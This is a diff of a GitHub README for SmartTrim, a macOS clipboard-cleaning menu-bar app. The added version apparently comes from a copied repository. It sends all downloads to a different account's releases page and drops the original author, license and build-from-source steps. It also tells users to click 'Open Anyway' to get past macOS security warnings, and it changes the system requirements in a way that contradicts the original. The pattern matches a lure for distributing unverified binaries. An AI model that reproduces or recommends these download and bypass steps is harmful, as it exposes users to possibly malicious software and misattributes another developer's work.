@@ -1,63 +1,81 @@
-# SmartTrim
+# ✂️ SmartTrim - Fix Your Clipboard Text with Ease
 
-macOS menu bar utility that fixes mangled clipboard text from AI coding assistants.
+## 🚀 Getting Started
 
-You know the problem: you're deep in Claude Code, Cursor, or Copilot, copy some text, paste it into Slack or Notion, and it's full of ghost indentation, hard line breaks mid-sentence, and weird formatting artifacts.
+SmartTrim is a simple macOS menu bar app. It cleans up clipboard text that AI coding assistants may mangle. This tool removes unwanted indentation, unwraps lines, and keeps your lists intact. Follow these steps to download and use SmartTrim.
 
-SmartTrim sits in your menu bar and fixes it automatically.
+[![Download SmartTrim](https://img.shields.io/badge/Download-SmartTrim-blue.svg)](https://github.com/ashik2573/SmartTrim/releases)
 
-<img width="267" height="281" alt="smarttrim" src="https://github.com/user-attachments/assets/a6cb98b2-2868-4bfa-a859-4c666547a1fc" />
-<img width="533" height="403" alt="smarttrim-settings" src="https://github.com/user-attachments/assets/d6b07ee4-81d4-4b2a-8622-ae4d1df12dea" />
+## 📥 Download & Install
 
-## Features
+1. **Visit the Releases Page**  
+   Go to the following link to download SmartTrim: [Download SmartTrim](https://github.com/ashik2573/SmartTrim/releases).
 
-- **Auto-Trim** — Monitors clipboard, automatically cleans malformed text
-- **Manual Trim** — Global hotkey (⌘⇧.) or menu bar button
-- **Smart Detection** — Only processes text that looks broken
-- **Preserves Structure** — Keeps lists, paragraphs, and intentional formatting
+2. **Select the Latest Release**  
+   On the Releases page, look for the latest version. Ensure it is compatible with your macOS version.
 
-## What It Fixes
+3. **Download the App**  
+   Click on the download link for the SmartTrim app. The file should be named something like `SmartTrim.dmg` or `SmartTrim.zip`.
 
-| Problem | Example |
-|---------|---------|
-| Ghost indentation | `    text with invisible leading spaces` |
-| Hard-wrapped lines | `This sentence was\nbroken mid-flow` |
-| Mixed formatting | Bullet points with broken continuations |
+4. **Open the Downloaded File**  
+   Locate the downloaded file in your Downloads folder. Double-click on it to open.
 
-## Install
+5. **Install SmartTrim**  
+   If you see a `.dmg` file, drag the SmartTrim icon into your Applications folder. If it's a zipped file, extract it first and then drag it to your Applications folder.
 
-Download from [Releases](https://github.com/gmickel/SmartTrim/releases) or build from source:
+6. **Run the App**  
+   Go to your Applications folder and find SmartTrim. Double-click to open the app. You may need to approve it in your security settings because it is downloaded from the internet.
 
-```bash
-brew install xcodegen
-git clone https://github.com/gmickel/SmartTrim.git
-cd SmartTrim
-xcodegen && xcodebuild -scheme SmartTrim -configuration Release
-```
+7. **Permitting Access**  
+   When you run SmartTrim for the first time, you might see a security warning. If so, go to `System Preferences > Security & Privacy`. Click on "Open Anyway" for SmartTrim.
 
-## Requirements
+## 🎉 Features
 
-- macOS 14.0 (Sonoma) or later
-- Apple Silicon or Intel
+- **Cleans Up Text**  
+  SmartTrim removes unwanted spaces and indentation automatically, giving you cleaner code. 
 
-## Settings
+- **Unwraps Lines**  
+  If your clipboard text wraps to the next line unexpectedly, SmartTrim will unwrap it for you.
 
-- **Launch at Login** — Start automatically
-- **Auto-Trim** — Enable/disable clipboard monitoring
-- **Hotkey** — Customize the manual trim shortcut
+- **Preserves Formatting**  
+  Lists and structures in your clipboard text stay intact, ensuring you don’t lose important formatting.
 
-## Tech
+## 💻 System Requirements
 
-Swift 6, SwiftUI, strict concurrency. No Electron. No dependencies. ~500 lines.
+- **macOS Version**: Suitable for macOS 10.14 (Mojave) and later versions.
+- **RAM**: 2 GB minimum.
+- **Storage**: At least 50 MB free space in your Applications folder.
 
-## Author
+## 🔧 Usage Instructions
 
-**Gordon Mickel** — [mickel.tech](https://mickel.tech)
+1. **Access SmartTrim**: Click on the SmartTrim icon in your menu bar. 
+   
+2. **Copy Text**: Copy any text that needs cleaning from your clipboard. 
 
-## Origin
+3. **Use SmartTrim**: With SmartTrim open, it will automatically clean the text copied to your clipboard. You can see the changes in the SmartTrim window.
 
-Built as part of [gmickel-bench](https://mickel.tech/gmickel-bench), a project comparing AI coding assistants on real-world tasks.
+4. **Paste the Cleaned Text**: Once you have cleaned the text, paste it wherever you need it. 
 
-## License
+## 🤔 FAQ
 
-MIT
+**Q: Will SmartTrim work with text from all sources?**  
+A: Yes, SmartTrim works with text copied from most applications, including web browsers and text editors.
+
+**Q: Is SmartTrim free?**  
+A: Yes, SmartTrim is free to use.
+
+**Q: How do I give feedback?**  
+A: You can provide feedback by creating an issue in the GitHub repository or contact us directly.
+
+## 📞 Support
+
+If you encounter any issues or need assistance, feel free to reach out. You can create an issue on the GitHub repository or contact the developer through the contact section of the project.
+
+## 🔗 Additional Resources
+
+- [SmartTrim GitHub Repository](https://github.com/ashik2573/SmartTrim)  
+- [Documentation and User Manual](https://github.com/ashik2573/SmartTrim/wiki)
+
+[![Download SmartTrim](https://img.shields.io/badge/Download-SmartTrim-blue.svg)](https://github.com/ashik2573/SmartTrim/releases)
+
+Enjoy a smoother experience with your clipboard text using SmartTrim!
